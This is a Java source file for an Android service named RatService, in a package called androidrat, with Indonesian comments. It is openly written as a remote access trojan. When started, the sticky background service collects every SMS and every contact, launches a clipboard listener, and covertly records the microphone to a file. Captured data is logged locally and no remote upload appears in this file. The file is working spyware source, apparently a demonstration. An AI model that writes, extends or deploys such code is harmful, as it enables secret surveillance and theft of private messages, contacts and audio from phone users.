package com.example.androidrat;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;

import androidx.annotation.Nullable;

import android.media.MediaRecorder;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class RatService extends Service {

    private static final String TAG = "RatService";
    private MediaRecorder mediaRecorder;
    private boolean isRecording = false;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service onCreate: Layanan RAT sedang dibuat.");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service onStartCommand: Layanan RAT dimulai.");
        fetchData();

        // Mulai layanan pendengar clipboard
        try {
            Intent clipboardIntent = new Intent(this, ClipboardListenerService.class);
            startService(clipboardIntent);
            Log.d(TAG, "ClipboardListenerService berhasil dimulai.");
        } catch (Exception e) {
            Log.e(TAG, "Gagal memulai ClipboardListenerService", e);
        }

        return START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (isRecording) {
            stopRecording();
        }
        Log.d(TAG, "Service onDestroy: Layanan RAT dihentikan.");
    }

    private void fetchData() {
        // Jalankan pengambilan data di thread terpisah agar tidak memblokir main thread
        new Thread(() -> {
            Log.d(TAG, "fetchData: Memulai pengambilan data di latar belakang...");
            try {
                // Beri jeda sedikit untuk memastikan service sudah stabil
                Thread.sleep(2000);
                getSms();
                Thread.sleep(1000);
                getContacts();
                Thread.sleep(1000);
                recordMicrophone();
            } catch (InterruptedException e) {
                Log.e(TAG, "Thread pengambilan data terganggu", e);
            }
        }).start();
    }

    private void getSms() {
        Log.d(TAG, "Mulai mengambil SMS...");
        ContentResolver contentResolver = getContentResolver();
        Uri uri = Telephony.Sms.CONTENT_URI;
        try (Cursor cursor = contentResolver.query(uri, null, null, null, "date DESC")) {
            if (cursor == null) {
                Log.e(TAG, "Gagal query SMS, cursor null.");
                return;
            }

            if (cursor.moveToFirst()) {
                Log.d(TAG, "Jumlah SMS ditemukan: " + cursor.getCount());
                int addressColumn = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
                int bodyColumn = cursor.getColumnIndex(Telephony.Sms.BODY);
                int dateColumn = cursor.getColumnIndex(Telephony.Sms.DATE);
                int typeColumn = cursor.getColumnIndex(Telephony.Sms.TYPE);

                do {
                    String address = cursor.getString(addressColumn);
                    String body = cursor.getString(bodyColumn);
                    long dateMillis = cursor.getLong(dateColumn);
                    String date = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(dateMillis));
                    int type = cursor.getInt(typeColumn);
                    String smsType;
                    switch (type) {
                        case Telephony.Sms.MESSAGE_TYPE_INBOX: smsType = "INBOX"; break;
                        case Telephony.Sms.MESSAGE_TYPE_SENT: smsType = "SENT"; break;
                        case Telephony.Sms.MESSAGE_TYPE_DRAFT: smsType = "DRAFT"; break;
                        default: smsType = "UNKNOWN";
                    }
                    // Log dengan format yang lebih bersih
                    Log.i("RAT_SMS_LOG", String.format("Type: %s, From: %s, Date: %s, Body: %s", smsType, address, date, body.replace("\n", " ")));
                } while (cursor.moveToNext());
            } else {
                Log.d(TAG, "Tidak ada SMS yang ditemukan.");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error saat mengambil SMS", e);
        }
        Log.d(TAG, "Selesai mengambil SMS.");
    }

    private void getContacts() {
        Log.d(TAG, "Mulai mengambil Kontak...");
        ContentResolver contentResolver = getContentResolver();
        Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        try (Cursor cursor = contentResolver.query(uri, null, null, null, ContactsContract.Contacts.DISPLAY_NAME + " ASC")) {
            if (cursor == null) {
                Log.e(TAG, "Gagal query Kontak, cursor null.");
                return;
            }

            if (cursor.moveToFirst()) {
                Log.d(TAG, "Jumlah Kontak ditemukan: " + cursor.getCount());
                int nameColumn = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                int numberColumn = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

                do {
                    String name = cursor.getString(nameColumn);
                    String number = cursor.getString(numberColumn);
                    // Log dengan format yang lebih bersih
                    Log.i("RAT_CONTACT_LOG", String.format("Name: %s, Number: %s", name, number));
                } while (cursor.moveToNext());
            } else {
                Log.d(TAG, "Tidak ada Kontak yang ditemukan.");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error saat mengambil Kontak", e);
        }
        Log.d(TAG, "Selesai mengambil Kontak.");
    }

    private void recordMicrophone() {
        if (isRecording) {
            Log.d(TAG, "Perekaman sudah berjalan.");
            return;
        }

        File outputFile = new File(getCacheDir(), "mic_recording.3gp");

        mediaRecorder = new MediaRecorder();
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        mediaRecorder.setOutputFile(outputFile.getAbsolutePath());

        try {
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
            Log.i(TAG, "Perekaman mikrofon dimulai. Menyimpan ke: " + outputFile.getAbsolutePath());

            // Rekam selama 10 detik untuk demonstrasi
            new Thread(() -> {
                try {
                    Thread.sleep(10000); // 10 detik
                } catch (InterruptedException e) {
                    Log.e(TAG, "Thread perekaman mikrofon terganggu", e);
                } finally {
                    stopRecording();
                }
            }).start();

        } catch (IOException e) {
            Log.e(TAG, "Gagal mempersiapkan MediaRecorder", e);
            releaseMediaRecorder();
        } catch (IllegalStateException e) {
            Log.e(TAG, "Gagal memulai MediaRecorder", e);
            releaseMediaRecorder();
        }
    }

    private void stopRecording() {
        if (isRecording && mediaRecorder != null) {
            try {
                mediaRecorder.stop();
                Log.i(TAG, "Perekaman mikrofon dihentikan.");
            } catch (IllegalStateException e) {
                Log.e(TAG, "Gagal menghentikan MediaRecorder", e);
            } finally {
                releaseMediaRecorder();
            }
        }
    }

    private void releaseMediaRecorder() {
        if (mediaRecorder != null) {
            mediaRecorder.reset();
            mediaRecorder.release();
            mediaRecorder = null;
            isRecording = false;
        }
    }
}
